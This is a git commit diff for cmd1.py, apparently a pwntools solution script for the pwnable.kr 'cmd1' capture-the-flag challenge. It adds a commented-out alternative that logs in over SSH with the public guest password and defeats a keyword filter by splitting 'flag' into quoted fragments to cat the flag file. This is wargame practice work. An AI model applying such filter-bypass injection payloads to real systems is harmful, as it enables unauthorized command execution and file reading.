dcb42096b8782bc267e3722f5dcc6fcb6eccb792
pipspelare <reqwsha@mail.ru>
2026-08-18 17:36:27 +1100

    cmd1 alt

--- cmd1.py
+++ cmd1.py
@@ -13,3 +13,24 @@ flag = proc.recvrepeat(timeout=2)
 log.success(b"Flag: " + flag)
 proc.close()
 remote.close()
+
+# # # boring alternative
+
+# from pwn import ssh, log
+#
+# payload = b'./cmd1 '
+# payload += b'"/bin/cat '
+# payload += b"'fl'"
+# payload += b"'ag'"
+# payload += b'"'
+#
+# remote = ssh('cmd1', 'pwnable.kr', password='guest', port=2222)
+# proc = remote.shell()
+#
+# proc.sendline(payload)
+#
+# flag = proc.recvrepeat(timeout=2)
+#
+# log.success(b"Flag: " + flag)
+# proc.close()
+# remote.close()
